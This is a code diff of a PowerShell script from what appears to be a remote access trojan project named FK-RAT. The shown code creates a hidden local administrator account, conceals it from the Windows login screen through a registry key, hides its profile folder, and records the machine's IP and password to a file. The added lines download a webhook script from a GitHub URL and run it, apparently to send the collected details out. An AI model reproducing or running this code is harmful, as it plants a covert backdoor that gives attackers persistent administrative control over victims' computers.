@@ -31,10 +31,12 @@ $uName = "fkrat"
 $pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
+$webhook = Get-Content ./webhook
 
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
 )
+
 ## Create Admin
 createAdmin -uName $uName -pWord $pWord
 
@@ -42,6 +44,10 @@ createAdmin -uName $uName -pWord $pWord
 New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
 Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+
+## get webhook
+Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1
+Start-Process .\webhook.ps1 $webhook
 
 ## goto Temp and make dir 
 Set-Location $temp	
